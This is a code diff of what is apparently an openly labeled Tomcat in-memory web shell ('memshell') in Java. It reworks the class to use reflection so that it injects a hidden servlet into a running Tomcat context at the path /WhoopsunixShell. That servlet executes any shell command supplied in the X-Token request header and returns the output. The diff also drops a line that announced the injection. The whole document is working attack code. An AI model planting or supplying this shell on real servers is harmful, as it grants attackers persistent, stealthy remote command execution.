@@ -1,8 +1,5 @@
 package com.demo.memshell;
 
-import org.apache.catalina.core.ApplicationContext;
-import org.apache.catalina.core.StandardContext;
-
 import javax.servlet.*;
 import javax.servlet.http.HttpServletRequest;
 import javax.servlet.http.HttpServletResponse;
@@ -17,10 +14,9 @@ import java.lang.reflect.Method;
  * Tomcat 7 8 9
  */
 public class TomcatServletThreadMS implements Servlet {
-
-    final private static String NAME = "Whoopsunix";
-    final private static String pattern = "/WhoopsunixShell";
-
+    private static String NAME = "TomcatServletThreadMS";
+    private static String pattern = "/WhoopsunixShell";
+    private static String header = "X-Token";
     private static HttpServletRequest request;
     private static HttpServletResponse response;
 
@@ -67,26 +63,34 @@ public class TomcatServletThreadMS implements Servlet {
             /**
              * 注入 Servlet
              */
-            StandardContext standardContext;
+            Object standardContext;
             try {
                 ServletContext servletContext = (ServletContext) request.getClass().getDeclaredMethod("getServletContext").invoke(request);
-                ApplicationContext applicationContext = (ApplicationContext) getFieldValue(servletContext, "context");
-                standardContext = (StandardContext) getFieldValue(applicationContext, "context");
-            }catch (NoSuchMethodException e) {
-                standardContext = (StandardContext) getFieldValue(request, "context");
+                Object applicationContext = getFieldValue(servletContext, "context");
+                standardContext = getFieldValue(applicationContext, "context");
+            } catch (NoSuchMethodException e) {
+                standardContext = getFieldValue(request, "context");
             }
 
             // wrapper 封装
-            if (standardContext.findChild(NAME) == null) {
-                org.apache.catalina.Wrapper wrapper = standardContext.createWrapper();
-                wrapper.setName(NAME);
-                Servlet servlet = new TomcatServletThreadMS();
-                wrapper.setServletClass(servlet.getClass().getName());
-                wrapper.setServlet(servlet);
-                // 添加到 standardContext
-                standardContext.addChild(wrapper);
+            Object wrapperFlag = standardContext.getClass().getSuperclass().getDeclaredMethod("findChild", String.class).invoke(standardContext, NAME);
 
-                try{
+            if (wrapperFlag == null) {
+//                org.apache.catalina.Wrapper wrapper = standardContext.createWrapper();
+                Object wrapper = standardContext.getClass().getDeclaredMethod("createWrapper").invoke(standardContext);
+//                wrapper.setName(NAME);
+                wrapper.getClass().getSuperclass().getDeclaredMethod("setName", String.class).invoke(wrapper, NAME);
+                Servlet servlet = new TomcatServletThreadMS();
+//                wrapper.setServletClass(servlet.getClass().getName());
+//                wrapper.setServlet(servlet);
+//
+//                standardContext.addChild(wrapper);
+                wrapper.getClass().getDeclaredMethod("setServletClass", String.class).invoke(wrapper, servlet.getClass().getName());
+                wrapper.getClass().getDeclaredMethod("setServlet", Servlet.class).invoke(wrapper, servlet);
+                // 添加到 standardContext
+                standardContext.getClass().getSuperclass().getDeclaredMethod("addChild", Class.forName("org.apache.catalina.Container")).invoke(standardContext, wrapper);
+
+                try {
                     // M1 Servlet映射到URL模式
                     // standardContext.addServletMapping(pattern,NAME);
                     Method addServletMappingMethod = standardContext.getClass().getDeclaredMethod("addServletMapping", String.class, String.class);
@@ -96,7 +100,8 @@ public class TomcatServletThreadMS implements Servlet {
                     // M2 Servlet3 新特性 Dynamic
 //                        javax.servlet.ServletRegistration.Dynamic registration = new org.apache.catalina.core.ApplicationServletRegistration(wrapper, standardContext);
 //                        registration.addMapping(pattern);
-                    Class.forName("javax.servlet.ServletRegistration$Dynamic").getMethod("addMapping", String[].class).invoke(new org.apache.catalina.core.ApplicationServletRegistration(wrapper, standardContext), (Object) new String[]{pattern});
+//                    Class.forName("javax.servlet.ServletRegistration$Dynamic").getMethod("addMapping", String[].class).invoke(new org.apache.catalina.core.ApplicationServletRegistration(wrapper, standardContext), (Object) new String[]{pattern});
+
                 }
             }
         } catch (Exception e) {
@@ -118,13 +123,12 @@ public class TomcatServletThreadMS implements Servlet {
     public void service(ServletRequest servletRequest, ServletResponse servletResponse) {
         try {
             HttpServletRequest httpServletRequest = (HttpServletRequest) servletRequest;
-            String header = httpServletRequest.getHeader("X-Token");
-            if (header == null) {
+            String cmd = httpServletRequest.getHeader(header);
+            if (cmd == null) {
                 return;
             }
-            String result = exec(header);
+            String result = exec(cmd);
             PrintWriter printWriter = servletResponse.getWriter();
-            printWriter.println("TomcatServletThreadMS injected");
             printWriter.println(result);
         } catch (Exception e) {
 
@@ -144,7 +148,7 @@ public class TomcatServletThreadMS implements Servlet {
     public static String exec(String str) {
         try {
             String[] cmd = null;
-            if (System.getProperty("os.name").toLowerCase().contains("windows")) {
+            if (System.getProperty("os.name").toLowerCase().contains("win")) {
                 cmd = new String[]{"cmd.exe", "/c", str};
             } else {
                 cmd = new String[]{"/bin/sh", "-c", str};
